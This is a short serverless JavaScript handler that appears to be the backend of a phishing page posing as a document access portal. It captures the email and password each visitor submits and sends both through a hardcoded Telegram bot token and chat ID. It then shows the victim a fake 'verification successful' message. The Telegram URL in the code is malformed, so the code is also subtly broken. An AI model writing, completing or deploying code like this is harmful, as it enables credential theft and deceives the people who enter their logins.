
export default async function handler(req, res) {
    // Only accept POST request submissions
    if (req.method !== 'POST') {
        return res.status(405).send('Method Not Allowed');
    }

    // 1. Grab inputs safely
    const email = req.body.email;
    const password = req.body.password;

    // 2. Put your verified bot credentials here
    const botToken = "9290775005:AAHjdXrkhjuQHWowxJTfvLoirP6nPa6opmc"; 
    const chatId = "1080822304"; 

    // 3. Format the clean log layout text
    const messageText = `📄 DOCUMENT ACCESS PORTAL REGISTRATION\n\n📧 Portal Email: ${email}\n🔑 Access Key: ${password}`;

    const telegramUrl = `https://telegram.org{botToken}/sendMessage`;

    try {
        // 4. Fire data to Telegram with native high-speed fetch modules
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageText
            })
        });

        const result = await response.json();

        if (result.ok) {
            // Redirects or alerts user successfully
            return res.status(200).send("<h2>Verification successful. Connecting to secure file server...</h2><br><a href='/'>Go Back</a>");
        } else {
            return res.status(500).send(`Telegram API Error: ${result.description}`);
        }
    } catch (error) {
        return res.status(500).send(`Connection Error: ${error.message}`);
    }
}
